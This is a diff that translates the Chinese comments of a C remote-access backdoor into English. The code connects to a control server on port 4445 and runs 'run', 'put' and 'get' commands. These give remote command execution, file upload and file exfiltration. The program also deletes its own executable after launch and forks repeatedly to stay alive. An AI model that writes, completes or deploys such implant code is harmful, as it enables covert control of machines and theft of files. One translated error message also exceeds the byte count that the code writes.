@@ -16,13 +16,13 @@
 #include <pthread.h>
 
 #ifndef SERVER_IP
-    #define SERVER_IP "127.0.0.1"    //定义服务器IP地址
+    #define SERVER_IP "127.0.0.1"    //Define the Server's IP
 #endif
 
-#define SERVER_PORT 4445         //定义服务器端口
-#define PATH_MAX 1024            //定义文件路径最大长度
-#define BUFSIZE 4096             //定义缓冲区大小
-#define CMD_RES_SIZE 4900        //定义单条命令执行结果缓冲区大小
+#define SERVER_PORT 4445         //Define server port
+#define PATH_MAX 1024            //Define path max
+#define BUFSIZE 4096             //Define buffer size
+#define CMD_RES_SIZE 4900        //Define a single command execution result buffer size
 
 //get own absolute path dynamiclly
 char *getpath()
@@ -38,7 +38,7 @@ char *getpath()
     return buf;
 }
 
-//创建阻塞型socket
+//Create a blocking socket
 int create_socket(char *host_ip, int port)
 {
     int sockfd;
@@ -66,7 +66,7 @@ int create_socket(char *host_ip, int port)
     return sockfd;
 }
 
-//从服务器请求命令
+//Request a command from the server
 int read_cmd(int sockfd, char *result)
 {
     write(sockfd, "[get cmd]\n", 10);
@@ -126,13 +126,13 @@ int executeCMD(const char *cmd, char *result)
 } 
 
 /*
- *解析并执行从服务器获取到的命令
- *支持3中类型的命令：run,put,get
- *分别对应远程命令执行、文件上传、文件下载
+ *Parse and execute commands got from the server
+ *Supports 3 types of commands：run,put,get
+ *Corresponding to remote code execution, file upload, file download
  */
 int parse_cmd(int sockfd, char *cmd, char *result)
 {
-    /*删除掉命令末尾的结束标志*/
+    /*Remove the end flag at the end of the command*/
     char *cmd_end = strstr(cmd, "[!FINISHED");
     cmd_end[0] = '\0';
     
@@ -141,7 +141,7 @@ int parse_cmd(int sockfd, char *cmd, char *result)
 
 
     if(strncmp(cmd, "run:", 4) == 0)
-    /*远程命令执行，格式 run:[空格]commmand*/
+    /*Remote code execution, format run[:space]command*/
     {
         index += 4;
         while(cmd[index] == ' ') index++;
@@ -155,7 +155,7 @@ int parse_cmd(int sockfd, char *cmd, char *result)
         ret = executeCMD(cmd_run, result);
     }
     else if(strncmp(cmd, "put:", 4) == 0)
-    /*文件上传，格式：put:[空格]服务器本地文件路径[空格]文件存储名*/
+    /*File upload, format: put: [space] server local file path [space] file storage name*/
     {
         index += 4;
         while(cmd[index] == ' ') index++;
@@ -165,28 +165,28 @@ int parse_cmd(int sockfd, char *cmd, char *result)
         while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
         char filepath[BUFSIZE];
         
-        /*读取文件存储名*/
+        /*Read file storage name*/
         strncpy(filepath, cmd+index, line_end - index);
         
-        /*文件传输准备*/
+        /*File transfer preparation*/
         write(sockfd, "ready\n", 6);
         FILE *fp = fopen(filepath, "wb");
         char buf[BUFSIZE];
         char *end_ptr = NULL;
         
-        /*接收文件*/
+        /*Receive files*/
         do {
             memset(buf, 0, BUFSIZE);
             int bytes = recv(sockfd, buf, BUFSIZE, 0);
             if(bytes > 0)
             {
-                //文件接收结束标志为[!FINISHED]
+                //The file reception end flag is [!FINISHED]
                 end_ptr = strstr(buf, "[!FINISHED]");
                 if (end_ptr != NULL)
                 {
                     bytes = end_ptr - buf;
                 }
-                //将接收的数据写入文件
+                //Write received data to a file
                 int wbytes = fwrite(buf, 1, bytes, fp);
                 if (wbytes != bytes)
                 {
@@ -198,7 +198,7 @@ int parse_cmd(int sockfd, char *cmd, char *result)
             }
             else if(bytes == -1)
             {
-                //异常结束，关闭文件后退出程序
+                //Abnormal end, exit the program after closing the file
                 fclose(fp);
                 exit(-1);
             }
@@ -208,7 +208,7 @@ int parse_cmd(int sockfd, char *cmd, char *result)
         return 0;
     }
     else if(strncmp(cmd, "get:", 4) == 0)
-    /*下载文件，格式：get:[空格]受控端文件路径*/
+    /*Download file, format: get: [space] controlled file path*/
     {
         index += 4;
         while(cmd[index] == ' ') index++;
@@ -216,20 +216,20 @@ int parse_cmd(int sockfd, char *cmd, char *result)
         while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
         char filepath[BUFSIZE];
         
-        //读取文件名
+        //Read file name
         strncpy(filepath, cmd+index, line_end - index);
         
-        //文件下载准备
+        //File download preparation
         write(sockfd, "ready\n", 6);
         FILE *fp = fopen(filepath, "rb");
         if (!fp)
         {
-            //文件打开失败
-            write(sockfd, "[ERROR]找不到指定文件或没有权限\n", 20);
+            //File open failed
+            write(sockfd, "[ERROR]Cannot find the specified file or have no permissions.\n", 20);
             exit(-1);
         }
         
-        //开始文件传输
+        //Start file transfer
         char buf[BUFSIZE];
         do {
             memset(buf, 0, BUFSIZE);
@@ -256,7 +256,7 @@ int main()
     char *self_path = getpath();
 
 #ifndef DEBUG
-    //启动程序后删除可执行文件
+    //Delete the executable after starting the program
     remove(self_path);
 #endif 
     int count = -1;
@@ -270,9 +270,9 @@ int main()
             printf("there is something wrong\n");
 #endif
         }
-        if (pid > 0) //父进程
+        if (pid > 0) //Parent process
         {
-            /*每执行0x1000次fork则连接一次服务器*/
+            /*Connect the server once every 0x1000 forks*/
             if (count & 0xfff)
             {
                 exit(0);
